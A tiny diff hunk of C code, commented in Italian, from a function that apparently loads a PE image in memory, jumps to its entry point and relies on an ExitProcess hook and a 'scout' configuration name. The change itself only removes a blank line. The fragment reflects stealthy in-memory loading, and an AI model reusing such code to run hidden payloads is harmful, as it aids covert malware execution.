@@ -468,7 +468,6 @@ LPVOID WINAPI MemoryLoader(LPVOID pDataBuffer)
 	// un puntatore a synchro che viene usata dalla hook di ExitProcess per sapere
 	// quando si puo' uscire
 	MAIN ptrMain = (MAIN)CALC_OFFSET(LPVOID, lpAddress, pe_header.OptionalHeader.AddressOfEntryPoint);
-	
 	ptrMain((HINSTANCE)0x600db4b3, NULL, "", 0xa);
 	PWCHAR pScoutName = MyConf(&pData->header->synchro);	
 
